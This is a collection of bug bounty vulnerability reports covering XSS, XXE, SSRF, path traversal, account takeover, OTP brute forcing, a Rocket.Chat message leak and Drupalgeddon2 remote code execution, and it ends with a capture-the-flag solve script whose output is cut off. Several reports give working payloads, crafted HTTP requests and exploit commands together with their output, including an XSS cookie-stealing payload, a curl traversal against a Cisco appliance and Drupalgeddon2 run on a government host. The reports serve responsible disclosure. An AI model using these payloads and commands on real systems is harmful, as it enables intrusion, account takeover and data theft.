Report File: 1051029.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Access Control - Generic

Contents:

Summary: [Summary the vulnerabilities]
I am surfing on the bb3jobboard.topechelon.com website. I found a sensitive data including authentication key written in public accessible javascript file.
URL Vulnerability
https://bb3jobboard.topechelon.com/#!/search?page=1
Steps To Reproduce:
Open bb3jobboard.topechelon.com and add payloads javascript-fuzz
Directory sensitive is //job_board.js// parse this json files using jsonparseronline
and look response bytes In response you can see Sensitive ApiKey Disclosure
Sensitive Information has been leaked on this source page job_board.js
Open your network browser , this javascript source has high files can leads to (DoS)
Proof On Concept
Code 544 Bytes
1}]), angular.module("jb").config(["lkGoogleSettingsProvider", function(e) {
2    e.configure({
3        apiKey: "██████████",
4        clientId: "██████t.apps.googleusercontent.com",
5        scopes: ["https://www.googleapis.com/auth/drive.readonly"],
6        features: ["MULTISELECT_DISABLED"]
7    })
8}]), angular.module("jb.factories").factory("BoardSettingsFactory", ["railsResourceFactory", "PathToResourceRoute", function(e, t) {
9    var n = e({
10        url: t.convert(JBRoutes.jobBoardBoardSettingsPath),
11        name: "boardSettings"
12    });
Screenshots Proof
████
Impact
Information disclosure



==================================================

Report File: 1051369.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Stored

Contents:

Summary:
I have just gotten an email notification from my XSSHunter payload that my blind stored XSS has been triggered by an administrator on the █████████ site, in the following URL:
Code 18 Bytes
1https://█████/████
Admin IP address:
████████
User-Agent:
█████████
Cookies:
Code 6 Bytes
1██████
Injection Image:
███████
DB Creds exposed:
██████████.█████\█████a
Suggested Mitigation/Remediation Actions
Sanitizing the input on the back-end as well
Best Regards
nagli
Impact
Ability to capture administrator action when preforming activities on the back-end.
Extractions of DB credentials.
Access to private information.
Stealing the cookies of the administrator.



==================================================

Report File: 1051373.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Reflected

Contents:

Hi I found a XSS-R
To reproduce the issue please click the poc link and then press the "verify email" button
PoC:
https://www.reddit.com/verification/asd',%20alert(document.location),%20%27
Impact
With the help of XSS an attacker can steal your cookies, in many cases steal sessions, download malware onto your system and send a custom request.
Users can be socially engineered by the attacker by redirecting them from the real website to a fake one and there are many more attack scenarios that an expert attacker can perform with XSS.
It is also possible to inject html thus modifying the original page



==================================================

Report File: 1051734.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Business Logic Errors

Contents:

Hello
Summary:
I have found a no rate limit issue on the report functionality.
When you enabled the report functionality on your site, you can set a number of reports before deleting the comment reported.
By default, this functionality is unable, but if you enabled this and you set a $x number of reports before deleting the comment, an attacker can spamming this functionality and delete your comment.
Steps To Reproduce:
1) Login at https://intensedebate.com
2) Create your own site at https://intensedebate.com/install, and follow the instructions (use generic install)
3) After setup your site, go to https://www.intensedebate.com/user-dashboard, on click to Moderate.
<image_0>
4) Go to the comment setting by clicking to Comments
<image_1>
5) Setup the Report functionality by checked the Enable "Report this comment" button and set a number of reports before deleting the comment to 10 and save it
<image_2>
6) Go to your site and add a comment
7) With a other account go to your site, and report the comment manually x10
8) After spam the Report functionality
9) Refresh the page, and you will see the comment is deleted
POC
The video POC NoRateLimit.mp4
Thank you,
Fuzzme.
Impact
Delete any comment in any site when the report functionality is enabled



==================================================

Report File: 1051885.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Insufficiently Protected Credentials

Contents:

Summary:
A ██████████ application called "████" has an old endpoint that accepts insecure/test ████████ credentials despite being a publicly-accessible IP. This endpoint also provides the ability to view information that may be FOUO, to exfiltrate information on registered personnel or contractors, to upload files, and to change configuration settings with ███████████████ privileges.
Description:
The IP address ███ points to a deployment of an application called ████/█████, which is a DoD-owned system on █████████). The login for this deployment accepts insecure ███ credentials (███).
There is also an authentication/█████ panel accessible at https://██████████externally accessible with these credentials.
The ████████ system available through this login includes file upload features, data exfiltration and management, workspace management, and infrastructure management.
The ██████████ / authentication █████████istration system available through this login includes file import/export privileges, user management, RBAC management, HTTP header management, OAuth credential management, session management, and frankly anything else you can think of that would be in an ████████ panel.
████████ frontend:
#███████
#██████
#█████
███████ backend:
#███
#█████████
#█████
#██████
#██████
Step-by-step Reproduction Instructions
Navigate to https://████
Enter the username "██████" and the password "██████████"
After logging in, click "Launch" under ██████
Navigate to https://███████████
Enter the username "███" and the password "█████████"
Product, Version, and Configuration (If applicable)
████████████
███
Build Date: 25 November 2020
Suggested Mitigation/Remediation Actions
Immediately disable insecure ███████████████ credentials.
I would recommend preventing external access to the ████████ █████████ portal/requiring CAC as a best practice.
Impact
An unauthorized attacker can exfiltrate intelligence and personnel information stored in a staging █████/█████.
An unauthorized attacker can modify, insert, and delete intelligence and personnel information stored in a staging ████████/███████.
An unauthorized attacker can exfiltrate, modify, upload to, download from, and/or deny access to a staging ██████ environment through the ██████ ████ panel.
I did not feel comfortable seeing whether I could escalate file uploads to an RCE before getting DOD consent.



==================================================

Report File: 105434.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Uncontrolled Resource Consumption

Contents:

Open file xxe.xlsx like zip-archive
Read file xxe.xlsx\xl\worksheets\sheet1.xml
In file I wrote XXE payload:
Then, i went to https://rev-app.informatica.com and made new project and imported my XLSX-file
When it was impoted i see /etc/passwd file:
root❌0:0:root:/root:/bin/bash
bin❌1:1:bin:/bin:/sbin/nologin
daemon❌2:2:daemon:/sbin:/sbin/nologin
adm❌3:4:adm:/var/adm:/sbin/nologin
lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
sync❌5:0:sync:/sbin:/bin/sync
shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
halt❌7:0:halt:/sbin:/sbin/halt
mail❌8:12:mail:/var/spool/mail:/sbin/nologin
uucp❌10:14:uucp:/var/spool/uucp:/sbin/nologin
operator❌11:0:operator:/root:/sbin/nologin
games❌12:100:games:/usr/games:/sbin/nologin
gopher❌13:30:gopher:/var/gopher:/sbin/nologin
ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
nobody❌99:99:Nobody:/:/sbin/nologin
dbus❌81:81:System message bus:/:/sbin/nologin
vcsa❌69:69:virtual console memory owner:/dev:/sbin/nologin
abrt❌173:173::/etc/abrt:/sbin/nologin
haldaemon❌68:68:HAL daemon:/:/sbin/nologin
ntp❌38:38::/etc/ntp:/sbin/nologin
saslauth❌499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
postfix❌89:89::/var/spool/postfix:/sbin/nologin
sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
oprofile❌16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin
ec2-user❌500:500::/home/ec2-user:/bin/bash
scom❌501:501::/home/scom:/bin/bash
nscd❌28:28:NSCD Daemon:/:/sbin/nologin
nslcd❌65:55:LDAP Client User:/:/sbin/nologin
dataprep❌504:505::/home2/dataprep:/bin/bash
zabbix❌498:506::/home/zabbix:/bin/bash
Video (private): https://youtu.be/612SgFdOrB0



==================================================

Report File: 1054526.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Stored

Contents:

Summary:
Hello Team,
I found the Stored XSS vulnerability in the Custom Style section, this vulnerability can result in an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, performing requests in the name of the victim or for phishing attacks, by inviting the victim to become part of the manager or administrator.
Platform(s) Affected:
wordpress.com
Steps To Reproduce:
As an attacker, go to the feedback section, then go to the Polling section.
Add a new post or edit an existing post.
Scroll down, click All Styles.
Add a new Style.
Named the temporary style, click Save Style.
Change the Style Name with <noscript><p title= "</noscript><img src=x onerror=alert(document.cookie)>">, check the checkbox next to Save Style, click Save Style.
Script will be run.
Invite the victim in a way, go to manage then users.
Click invite, enter username or email, and send.
As a Victim, accept the attacker's invitation.
Go to the Feedback section.
Then go to the Polling section.
Add a new post or edit an existing post.
Scroll down, click All Styles.
Enter the Style that has been created by the previous Attacker.
Script will be run.
Supporting Material/References:
Screenshot_(538).png (F1109567)
Screenshot_(539).png (F1109568)
2020-12-09_08-24-14.mp4 (F1109569)
Impact
this vulnerability can result in an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, performing requests in the name of the victim or for phishing attacks, by inviting the victim to become part of the manager or administrator.



==================================================

Report File: 1055823.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Server-Side Request Forgery (SSRF)

Contents:

A Server Side Request Forgery vulnerability was found in the Add a custom Integration feature on console.helium.com. By creating a custom HTTP integration, and setting the integration endpoint to http://169.254.169.254/latest/meta-data private meta-data from the AWS EC2 instance running can be retrieved.
<image_0>
<image_1>
The server makes the HTTP request and sets the response body as the integration message every time that the device sends a packet. As the endpoint input is not validated, this makes the application vulnerable to a critical SSRF.
<image_2>
<image_3>
Endpoint set as: http://169.254.169.254/latest/meta-data/ami-id
<image_4>
Impact
By exploiting this vulnerability an attacker can get access to the server internal network and access private and critical information.



==================================================

Report File: 1056611.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Path Traversal

Contents:

Summary:
A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and obtain read and delete access to sensitive files on a targeted system. The vulnerability is due to a lack of proper input validation of the HTTP URL. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences.
Vulnerable Endpoint:
Code 49 Bytes
1https://129.0.176.5/+CSCOE+/session_password.html
Steps To Reproduce:
First I performed a curl request to validate that /session_password.html gave a 200 response.
Example to delete logo file "/+CSCOU+/csco_logo.gif".
Code 101 Bytes
1curl -k -H "Cookie: token=../+CSCOU+/csco_logo.gif" https://129.0.176.5/+CSCOE+/session_password.html
WHOIS
<image_0>
NOTE: No destructive behavior was performed on target.
Impact
An exploit could allow the attacker to view or delete arbitrary files on the system.



==================================================

Report File: 1058015.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Access Control - Generic

Contents:

Description
The flow in application is to sign up and wait for an email containing a one-time password, as soon as you login using that password, it asks you to change it. I took that password change request and applied on any email changing their password and it worked
Steps to produce:
1- Copy the following request: (note txtEMail and txtNewPassword parameters)
Code 699 Bytes
1POST /Login.aspx HTTP/1.1
2Host: ██████████.mil
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/x-www-form-urlencoded
8Content-Length: 1052
9Origin: https://█████.mil
10Connection: close
11Referer: https://██████.mil/Login.aspx
12Upgrade-Insecure-Requests: 1
13
14__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=████&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=█████████&txtMail=&txtEMail=[VICTIM_EMAIL]&reqEMailE_ClientState=&revEMailE_ClientState=&txtNewPassword=[DESIRED_PASSWORD]&btnNewPassword=Submit
2- Now, log in using any victim email with a random password and intercept the request at https://█████.mil/Login.aspx
3- Paste the request you copied above and change the txtEMail (to victim email) and txtNewPassword parameters and send it.
Impact
Full account takeover on any user.



==================================================

Report File: 1059758.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Restriction of Authentication Attempts

Contents:

Steps:
Visit the link https://www.██████/██████████and enter the valid ████████.
You will be redirect to the page where it will ask you to fill your ████████ and ████████ that you get in your mail.
Enter the wrong ███ and intercept the request.
Then bruteforce the ███.(You can use burp intruder)
After valid ████████ it will aks you to create new password
Request that I intercept
POST ███ HTTP/1.1
Host: www.███████
Connection: close
Content-Length: 197
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Origin: https://www.███████
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.█████████/█████████
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,mr-IN;q=0.8,mr;q=0.7,hi;q=0.6
Cookie: [value]
██████████&██████=[████████]
Impact
An attacker can takeover victim account if he has valid email related to the victim.



==================================================

Report File: 1060541.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Restriction of Authentication Attempts

Contents:

Summary:
Hello.
There is no rate limit protection in the endpoint https://mtnonline.com/nim/submit , Which could lead to brute force otp code.
How To Reproduce:
Visit https://mtnonline.com/nim and complete all the required field and submit.
when next page load, user will be ask otp code.
Enter any five digit number and intercept the request using burp suit.
Send the request to intruder and clear all the payload except for otp.
Select brute forcer in payload type and clear the alphabetic character in character set and leave only digit.
In the min. length and max. length enter 5.
Click on attact button.
In the attached image, all the response code where 303 which means see other, that is means try again.
If rate limit is working, from 3 to 4 request, their response should be 429 means too many request.
Supporting Material/References:
[attachment / reference]
Thanks
Impact
Attacker can send unlimited request before code the code to expire and guess the correct otp since it can be 5 minutes to expire.



==================================================

Report File: 1061591.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Access Control - Generic

Contents:

The issue is related to all Nextcloud versions. It is not patched yet. All versions (18-20) seems to be vulnerable. The issue came up in the following environment:
nextcloud docker image (20.0.2 and 20.0.3)
LDAP authentication
external SMB shares via DB stored credentials
The problem came up after several users could not access their mounted SMB shares. When I checked, what was going on, it seems that DB credentials are getting stored from the session (table oc_storages_credentials) to the DB. The problem is, that there is no check if the current user in the session is the same as the user for whom the credentials get stored.
It seems that the credentials saved in the corresponding table (oc_storages_credentials) are wrong and therefore all SMB shares are showing errors.
When I initially add the external storage SMB mounts in the settings and then a user logs in the first time, the SMB shares work (with the correct login) which gets correctly saved in the DB.
Afterwards I can find one single entry on the oc_storages_credentials-table
However, when I (as an admin) navigate to: https://cloud.example.org/settings/users the table oc_storages_credentials gets (pre)populated with all the users (and some random credentials) - this also includes all users who weren´t logged-in yet. When the user logs in afterwards the credentials entry is already there and does not get updated.
Steps to reproduce
Add external SMB mount with option "credentials saved in database"
Manually check the MYSQL table oc_storages_credentials - it should be empty
As an admin: navigate to (/settings/users)
Recheck the MYSQL table oc_storages_credentials - there is an entry for every user now
The stored credentials in the DB are now the admin credentials
user can act as the admin user (their LDAP / AD password is stored in oc_storages_credentials for every user
Expected behaviour
Do not populate the table oc_storages_credentials on "user list settings page"
If the current user credentials does not match the ones in the DB -> update it
Actual behaviour
password::logincredentials/credentials entries are getting deployed initially from the admin user ...
Bugfix / Patch
There should be two files affected:
/apps/files_external/lib/Lib/Auth/Password/LoginCredentials.php
/apps/files_external/lib/Listener/StorePasswordListener.php
It looks like there is a form of wrong impersonation going on here. -> The git-Diff for a security conform bugfix is attached.
Server configuration
I am using this docker image (no modifications): https://github.com/nextcloud/docker/tree/master/.examples/dockerfiles/full/fpm-alpine
Operating system: Docker on Ubuntu 20.04.1 LTS
Web server: nginx with php-fpm
Database: mariadb 10.5 as docker container
PHP version: 7php .4
Nextcloud version: 20.0.2
Updated from an older Nextcloud/ownCloud or fresh install: updated from nextcloud 18.0.11 -> 19.0 -> 20.0.3
Where did you install Nextcloud from:
Impact
Acting as a different user (as admin credentials are stored for every user in the DB)
get a normal user account and accessing SMB shares on the network with higher privileges as himself
getting access to internal ressources via external shared links



==================================================

Report File: 1061664.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Access Control - Generic

Contents:

Hi ,
I found to access https://alerta.khanacademy.org/ using signup bypass.That leak access to sensitive data of khanacademy.org
Step To Reproduce:
Go to https://alerta.khanacademy.org/#/signup
Inspect Q and remove ng-hide
<image_0>
You got Signup Form. Signup account using anythings@khanacademy.org mail.
<image_1>
When you successfully signup,You access alerta.khanacademy.org without confirm email.
<image_2>
If you not login direct .
Go to alerta.khanacademy.org/#/login.
Inspect Q and remove ng-hide
<image_3>
Login with your register info.
<image_4>
Impact
Attacker can access alerta dashboard
Thanks,
@nightmare_msf



==================================================

Report File: 1061736.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Business Logic Errors

Contents:

Hi, I hope you doing well
I found a critical endpoint which disclosed the personal information which can use to takeover any account present on https://██████████
#Steps:
Visit the link https://www.████████/███████ you will get my details, including first name and last name, mobile number and email_address related to the account.
Go to the forgot password link present at https://www.███████/ click on it.
Enter the mail address later you will be taken to another page which will ask you to enter mail address and pin
After entering mail address enter the pin as "████" as █████████ is at the endpoint.
It will validate and will ask you to change the password of that account.
Note: To get email list and pin list just decrease the number at the endpoint
for example https://www.████████/███will give you another mail_address and pin will be ██████████
Impact
An attacker can able to takeover any account that is present on that side.



==================================================

Report File: 1062538.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Information Disclosure

Contents:

Summary: Improper input validation allows pinning of arbitrary messages (in private channels), leaking the message content back to the sender.
Description:
Message pinning was found to lack input data validation, so that arbitrary messages can be pinned and leaked back to an unauthorized client.
Code 567 Bytes
1Meteor.methods({
2	pinMessage(message) {
3		if (!Meteor.userId()) {
4			toastr.error(TAPi18n.__('error-not-authorized'));
5			return false;
6		}
7		if (!settings.get('Message_AllowPinning')) {
8			toastr.error(TAPi18n.__('pinning-not-allowed'));
9			return false;
10		}
11		if (Subscriptions.findOne({ rid: message.rid }) == null) {
12			toastr.error(TAPi18n.__('error-pinning-message'));
13			return false;
14		}
15		toastr.success(TAPi18n.__('Message_has_been_pinned'));
16		return ChatMessage.update({
17			_id: message._id,
18		}, {
19			$set: {
20				pinned: true,
21			},
22		});
23	},
24	// ...
25});
The Meteor.method pinMessage accepts a message object as input with _id and rid keys.
With a known Message ID and any Room ID that is accessible by the attacker, the check room subscriptions can be circumvented, because the target chat message is not validated to be in the same room as validated with Subscriptions.findOne({ rid: message.rid }.
In addition to that the pinMessage function accepts JavaScript objects that are then directly forwarded to the MongoDB model, allowing attackers to use regular expressions to improve guessing of message IDs.
Code 122 Bytes
1Meteor.call("pinMessage", {
2  _id: { $regex: /.*/ },
3  rid: "<ACCESSIBLE_ROOM_ID>" 
4}, (...args) => console.log(...args));
The Meteor.call return data contains the message content, so that an arbitrary user with access to any channel can leak individual messages outside of their accessible channels.
Releases Affected:
3.9.10 / develop
Steps To Reproduce (from initial installation to vulnerability):
(Add details for how we can reproduce the issue)
Open Rocket.Chat
Find any accessible Room ID (for instance from channel avatar URL)
Open Web Inspector
Execute pinMessage Meteor.call and receive message content in return callback
Suggested mitigation
Check message object data types
Query the target rid along with the updated message _id.
Code 1.72 KiB
diff --git a/app/message-pin/client/pinMessage.js b/app/message-pin/client/pinMessage.js
index 9fbc2f778..c360c5d9c 100644
--- a/app/message-pin/client/pinMessage.js
+++ b/app/message-pin/client/pinMessage.js
@@ -1,4 +1,5 @@
 import { Meteor } from 'meteor/meteor';
+import { check } from 'meteor/check';
 import toastr from 'toastr';
 import { TAPi18n } from 'meteor/rocketchat:tap-i18n';
 
@@ -7,6 +8,8 @@ import { ChatMessage, Subscriptions } from '../../models';
 
 Meteor.methods({
        pinMessage(message) {
+               check(message._id, String);
+               check(message.rid, String);
                if (!Meteor.userId()) {
                        toastr.error(TAPi18n.__('error-not-authorized'));
                        return false;
@@ -22,6 +25,7 @@ Meteor.methods({
                toastr.success(TAPi18n.__('Message_has_been_pinned'));
                return ChatMessage.update({
                        _id: message._id,
+                       rid: message.rid
                }, {
                        $set: {
                                pinned: true,
@@ -29,6 +33,8 @@ Meteor.methods({
                });
        },
        unpinMessage(message) {
+               check(message._id, String);
+               check(message.rid, String);
                if (!Meteor.userId()) {
                        toastr.error(TAPi18n.__('error-not-authorized'));
                        return false;
@@ -44,6 +50,7 @@ Meteor.methods({
                toastr.success(TAPi18n.__('Message_has_been_unpinned'));
                return ChatMessage.update({
                        _id: message._id,
+                       rid: message.rid
                }, {
                        $set: {
                                pinned: false,
Impact
Content of arbitrary (private) messages can be leaked by any client with access to at least one room.



==================================================

Report File: 1063256.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Command Injection - Generic

Contents:

Summary
Due to an outdated Drupal version, remote code execution is possible on www.█████ via CVE-2018-7600.
Description
Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.
Vulnerable Host:
www.███
Visiting https://www.███/███ we can see that we have a Drupal with version 7.54, which was updated the last time in 2017-02-01.
There are several critical and highly critical vulnerabilities known for this version (see https://api.drupal.org/api/drupal/████████/7.x and https://www.drupal.org/security). Among them is SA-CORE-2018-002 (CVE-2018-7600), which I will demonstrate here.
Note: I am reporting this here, since the page https://www.███████ seems to belong to the █████████, which belongs to the DOD. The footer further states: ██████. [...]
Step-by-step Reproduction Instructions
Download the git repository with the exploit: git clone https://github.com/dreadlocked/Drupalgeddon2.git && cd Drupalgeddon2
Install dependencies if necessary gem install nokogiri
Install dependencies if necessary gem install nokogiri
Run the exploit with ruby ruby drupalgeddon2-customizable-beta.rb -u https://www.████████/ -v 7 -c id --form user/login
Parameters explanation:
Code 207 Bytes
1-u,     --url URL           Service URL
2-v,     --version VERSION   Target Drupal version {7,8}
3-c,     --command COMMAND   Command to execute
4--form  Form to attack, by default '/user/password' in Drupal 7 
The above command outputs:
Code 784 Bytes
1root@5b08dc005375:/Drupalgeddon2# ruby drupalgeddon2-customizable-beta.rb -u https://www.████/ -v 7 -c id --form user/login
2drupalgeddon2-customizable-beta.rb:184: warning: URI.escape is obsolete
3[i] Requesting: www.███████//user/password/?name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup
4[i] POST: form_id=user_pass&_triggering_element_name=name
5[i] 200
6[*] Obtained build id!: ████████
7drupalgeddon2-customizable-beta.rb:220: warning: URI.escape is obsolete
8drupalgeddon2-customizable-beta.rb:221: warning: URI.escape is obsolete
9[i] Requesting: www.█████/file/ajax/name/%23value/██████
10[i] POST: form_build_id=█████
11[i] Response code: 200
12uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
13root@5b08dc005375:/Drupalgeddon2# 
As we can see, we successfully executed the id command, which responded with uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
I am also providing the output of /etc/passwd which I obtained with command
Code 106 Bytes
1ruby drupalgeddon2-customizable-beta.rb -u https://www.██████/ -v 7 -c "cat /etc/passwd" --form user/login
Output:
Code 238 Bytes
1████
2██████
3███████
4████████
5█████████
6█████████
7██████████
8███
9████
10█████████
11██████████
12████
13██████████
14████████ █████
15█████████
16██████████
17████████
18██████████
19██████
20████
21█████████
22███████
23███████
24████
25██████████
26███
27█████
28█████
29██████
Resources
https://api.drupal.org/api/drupal/█████/7.x
https://www.drupal.org/security
https://github.com/dreadlocked/Drupalgeddon2
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600
https://www.drupal.org/sa-core-2018-002
Mitigation/Remediation Actions
Upgrade to the most recent version of Drupal 7 core.
Impact
Critical - Remote Code Execution



==================================================

Report File: 1063298.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Authentication Bypass Using an Alternate Path or Channel

Contents:

Summary:
Hello,
When hunting for your web application.
I have managed to go https://cars.fas.gsa.gov/cars/cars and get displayed with a form.
I have already tried to login to Cars and without success.
However i've noticed the loginChk() function and change the value of the form hence bypassing it and logging in succesfuly.
Steps To Reproduce:
go to https://cars.fas.gsa.gov/cars/cars
type loginChk() function in console.
It would return false.
Now type in console ( can be opened using F12). document.forms[0].scSelCen.value = "admin"
Now try to login by clicking on CARS button.
Supporting Material/References:
Navigator used : google chrome.
If you need any additional information. feel free to ask me.
PS : I think the website went for a maintenance right now.
Even though i didn't use anything of that panel.
Impact
Any attacker would have the access to admin panel and do whatever he wants.
As i can see , it's a platform for reporting accidents.



==================================================

Report File: 1065517.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Buffer Over-read

Contents:

Simple script to print all the flags. Full solution to follow (want to spend more time writing this, but am racing to be first 10 submissions):
Code 2.57 KiB
1echo "Flag 1 -- robots.txt"
2curl https://hackyholidays.h1ctf.com/robots.txt 2>/dev/null | grep flag
3
4echo ""
5echo "Flag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )"
6diff <(curl https://hackyholidays.h1ctf.com/assets/js/jquery.min.js 2>/dev/null | js-beautify) <(curl https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js 2>/dev/null | js-beautify) | grep "h1"
7
8echo ""
9echo "Flag 3 -- /people-rater"
10curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= 2>/dev/null | grep flag
11
12echo ""
13echo "Flag 4 -- /swag-shop"
14curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 2>/dev/null | grep flag
15
16echo ""
17echo "Flag 5 -- /secure-login (access:computer)"
18wget -q https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip 2>&1 > /dev/null
19unzip -P hahahaha my_secure_files_not_for_you.zip 2>&1 > /dev/null
20cat flag.txt
21rm my_secure_files_not_for_you.zip
22rm flag.txt
23rm xxx.png
24
25echo ""
26echo "Flag 6 -- /my-diary"
27curl https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.php.php 2>/dev/null | grep flag
28
29echo ""
30echo "flag 7 -- /hate-mail-generator"
31curl -X POST https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview --data 'preview_markup={{test}}{{email}}&preview_data={"test":"{{template:","email":"38dhs_admins_only_header.html}}"}' 2>/dev/null | grep flag
32
33
34echo ""
35echo "flag 8 -- /forum (grinch:BahHumbug)"
36curl https://hackyholidays.h1ctf.com/forum/3/2 -H 'Cookie: token=9F315347A655FFDAF70CD4A3529EE8A6' 2>/dev/null | grep flag
37
38echo ""
39echo "flag 9 -- /evil-quiz"
40curl -X POST https://hackyholidays.h1ctf.com/evil-quiz/admin --data 'username=admin&password=S3creT_p4ssw0rd-%24' 2>/dev/null | grep flag
41
42echo ""
43echo "flag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)"
44curl https://hackyholidays.h1ctf.com/signup-manager/ -H 'Cookie: token=8fdaa7ac725a0f905e775a32a5cb7038' 2> /dev/null | grep flag
45
46echo ""
47echo "flag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API ->grinchadmin:s4nt4sucks)"
48curl -X POST https://hackyholidays.h1ctf.com/attack-box/login --data "username=grinchadmin&password=s4nt4sucks" --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null > /dev/null
49curl https://hackyholidays.h1ctf.com/attack-box/ --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag
50
51
52echo ""
53echo "flag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -> target=127.0.0.1)"
54curl https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709 --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag
55rm cookie.txt
output:
Code 2.11 KiB
1Flag 1 -- robots.txt
2Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
3
4Flag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )
5<         h1_0 = 'la',
6<         h1_1 = '}',
7<         h1_2 = '',
8<         h1_3 = 'f',
9<         h1_4 = 'g',
10<         h1_5 = '{b7ebcb75',
11<         h1_6 = '8454-',
12<         h1_7 = 'cfb9574459f7',
13<         h1_8 = '-9100-4f91-';
14<     document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
15
16Flag 3 -- /people-rater
17{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
18
19Flag 4 -- /swag-shop
20{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
21
22Flag 5 -- /secure-login (access:computer)
23flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
24
25Flag 6 -- /my-diary
26    <h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>
27
28flag 7 -- /hate-mail-generator
29                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
30
31flag 8 -- /forum (grinch:BahHumbug)
32                    <div class="well well-sm" style="margin:0;font-size:12px">We've launched our recon server, gathered intelligence and pin pointed Santa's location!<br>Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!<br><br><strong>flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}</strong></div>
33
34flag 9 -- /evil-quiz
35            <h3 class="text-center">flag{6e8a2df4-5b14-400f-a85a-08a260b59135}</h3>
36
37flag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)
